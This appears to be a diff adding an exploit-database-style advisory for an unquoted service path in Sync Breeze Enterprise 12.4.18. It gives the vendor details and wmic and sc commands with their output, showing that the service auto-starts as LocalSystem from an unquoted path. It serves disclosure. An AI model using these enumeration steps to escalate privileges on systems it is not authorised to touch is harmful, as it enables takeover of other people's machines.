@@ -1,0 +1,24 @@
+Exploit Title: Sync Breeze Enterprise 12.4.18 - 'Sync Breeze Enterprise' Unquoted Service Path
+Exploit Author: boku
+Date: 2020-02-10
+Vendor Homepage: http://www.syncbreeze.com
+Software Link: http://www.syncbreeze.com/setups/syncbreezeent_setup_v12.4.18.exe
+Version: 12.4.18
+Tested On: Windows 10 (32-bit)
+
+C:\Users\elaglor>wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+Sync Breeze Enterprise          C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe             Auto
+
+C:\Users\elaglor>sc qc "Sync Breeze Enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Sync Breeze Enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Sync Breeze Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
